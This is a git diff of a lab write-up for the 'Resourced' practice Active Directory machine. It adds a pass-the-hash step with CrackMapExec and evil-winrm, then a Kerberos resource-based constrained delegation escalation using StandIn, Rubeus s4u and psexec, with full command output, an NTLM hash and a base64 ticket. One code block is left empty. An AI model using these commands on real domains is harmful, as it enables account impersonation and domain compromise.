@@ -1,6 +1,6 @@
 # "Resourced" (Intermediate)
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Information Gathering
 
@@ -262,6 +262,8 @@ cat secrets | cut -d":" -f4 | tee hashes.txt
 
 
 
+## Exploitation
+
 ### Passing The Hash with CrackMapExec
 
 {% code overflow="wrap" %}
@@ -283,10 +285,118 @@ evil-winrm resourced.local -u l.livingston -H 19a3a7550ce8c505c2d46b5e39d6f808
 
 <figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
-## Exploitation
-
-### Name of the technique
-
-This is the exploit
-
 ## Privilege Escalation
+
+### Kerberos Resource-Based Constrained Delegation
+
+* <mark style="color:yellow;">This exploit can occur when a user or group has GenericAll over an AD object</mark>
+* <mark style="color:yellow;">Select your pwned user, Outbound Object Control -> Transitive Object Control</mark>
+
+&#x20;<mark style="color:yellow;"></mark>&#x20;
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>User l.livingstone has GenericAll over an AD object</p></figcaption></figure>
+
+Now to exploit this...
+
+We need the following tools transferred over to the Windows target:
+
+* <mark style="color:yellow;">Rubeus.exe</mark>
+* <mark style="color:yellow;">StandIn.exe</mark>
+
+### Create new user object
+
+```
+.\StandIn_v13_Net45.exe --computer hacker --make
+
+[?] Using DC    : ResourceDC.resourced.local
+    |_ Domain   : resourced.local
+    |_ DN       : CN=hacker,CN=Computers,DC=resourced,DC=local
+    |_ Password : A9uh6RaUNGIDoh8
+
+[+] Machine account added to AD..
+```
+
+* Write down the generated password somewhere. Don't lose it.
+
+### Grab SID
+
+```
+Get-ADComputer -Filter * | Select-Object Name, SID
+
+Name       SID
+----       ---
+RESOURCEDC S-1-5-21-537427935-490066102-1511301751-1000
+hacker     S-1-5-21-537427935-490066102-1511301751-4101
+```
+
+### Use Rubeus to create tickets and impersonate administrator
+
+
+
+* To generate RC4, you can use Python:
+
+```
+python3
+
+
+```
+
+{% code overflow="wrap" %}
+```
+.\Rubeus.exe s4u /user:hacker /rc4:feaf50cd988e84293d190aac4d38f2ca /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt
+  ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'hacker@RESOURCED.LOCAL'
+[*] Using domain controller: ResourceDC.resourced.local (::1)
+[*] Sending S4U2self request to ::1:88
+[+] S4U2self success!
+[*] Got a TGS for 'administrator' to 'hacker@RESOURCED.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIFkDCCBYygAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoREbD1JFU09VUkNFRC5MT0NBTKITMBGgAwIBAaEKMAgbBmhhY2tlcqOCBGswggRnoAMCARehAwIBAaKCBFkEggRVfSla4pYMHP20rtVe6QRBM5T+4WCHuknvmM0jBgNVT9RHe4sn15Zq2Ccm2hkbItvA91iO9wcFOvVoYD7AHCrvMFqSCSjGmCfSPqvV8MrMshCYfhwLVHinOZcjxAr9MCVQEtQc7jtKeaTJxVmpy9J7rjjOHnXGB1YFgMHmGyA0ve8eJhOR7OmGvmHwCK5YxPmOo83Eqn4NgE1gn9y6DAJm5QHREqSqRmIjEXEAFvnuoI336a4yyZLNP5ulIZnyQGByPMcIDHOEj2TxWlGYNQK13etnbDJngopAJd2Zd89c+kYcnKENml16UF/LXQDdagDrbbS1R0xk03R7SEtteNuaJYibPk0bMFyoa7rFUWgbHD5L93vxNMtaNFXDkFpoujzSYvSc8xcS8fzJolX8tMkzK1BggvC7rtOTihKG3C24DZKU0lbiEy+rI6vyVLRwhBVn2X3pfumtNnOLYzP9xXleWNifYxvAnDkQLT0xOpfpqtUZu55ZCkTM2KYv+p98pMpizh5V6QMaaxHKqCb0+RrnzsLcIt0cESXAcVFX2I7Hzkn/tZdSYD9EXD4kETBSsZwknEpeLWYquTMMkCXjAkbg6PiVDusgECBKydC/nDFrWS+bQVjJZo8VlunJk2CsbKCO/g3lg4+47sAJu9tfW80q5oFXj80yuGSoWqQ51bKz+JcB9W7UvnB4KataDdqDXs2uj6t2yX0yX0JKzm7CWGeHiS9XAWvu6NzYHhRsD4Jno0uZW9kZkS6QeVkO8tpkAcEaIXqKwj8Z2PPc7AE+vwQniNV1QULEk1/stfOg0KuRxdGi1m+al4pzGmoqHkthfIQtnWQpundK1/8VOKD2QygsqlJS6QqRtAjdWs6uM2DcFVNbTqb3FjjQTh9Y4icOgEsagelAXFFNDiBGeo4j5i2MpHaADPtkITTBNkrcNu8PjO3Ljz5mJjdfN1QYDBDLk9lssIQK6eWRQhJZptNWCvN5OXH7BQRq+u33xa7eDtGjTKy4O2AwHrojQfhatMULwuzuW7UaD+n8uLngmIlphdIOetywbj1+kKzbISQFg/FEfOrIWGt7yGXfD0j3plyNuBBh3gsE5drgS53yXxJl9XhKJzdLCncX081WlNzAzmJbwAHKzr8vmQl/pcj+HWZFSvjSOKlY5Rq7q3sK3Hznxf86rPK9W8XERmAjMtD8jIjj4R0MxQmXCD+6iqxzuQXVustySdlcfCCv0MhDqGHumN/AL4LnMggadyZJW4HigLwolCXVsLXTKOhZIhF6ydffM/QP1u2esw+kyBu1bxw743ROUvvdeKACvMZOXsRvPb5o/11n853tkYNm4b0hoyvRLZ3fNFLCXdPCpJrssi3ofZtX9Og21cnokCoMfNQQ0cpSnUv9TG6aY0bqd45Y69K8PK9bjdfRSynDh2nwDqK8vYnNsj8gYmeXLvPul0YhSJqZcRw6kZHZXlQkStXwsFw1LCPoCXllZoWjgdMwgdCgAwIBAKKByASBxX2BwjCBv6CBvDCBuTCBtqAbMBmgAwIBF6ESBBA2sKwXx0ih0zF6QTk1B+CboREbD1JFU09VUkNFRC5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyMjExMDkyMTA5NDZaphEYDzIwMjIxMTEwMDcwOTQ2WqcRGA8yMDIyMTExNjIxMDk0NlqoERsPUkVTT1VSQ0VELkxPQ0FMqRMwEaADAgEBoQowCBsGaGFja2Vy
+```
+{% endcode %}
+
+<mark style="color:yellow;">Grab the Base64 encoded ticket and place it into a file called ticket.b64 on Kali:</mark>
+
+```
+nano ticket.b64
+
+cat ticket.b64 | base64 -d > ticket.kirbi
+
+python3 ticketConverter.py ticket.kirbi ticket.ccache
+```
+
+Run klist:
+
+```
+export KRB5CCNAME=ticket.ccache
+
+klist
+
+Ticket cache: FILE:ticket.ccache
+Default principal: administrator@RESOURCED.LOCAL
+
+Valid starting       Expires              Service principal
+11/09/2022 16:09:46  11/10/2022 02:09:46  cifs/resourcedc.resourced.local@RESOURCED.LOCAL
+        renew until 11/16/2022 16:09:46
+```
+
+Lastly, we can psexec into the target machine as the Administrator:
+
+```
+python3 psexec.py -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.81.175
+```
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
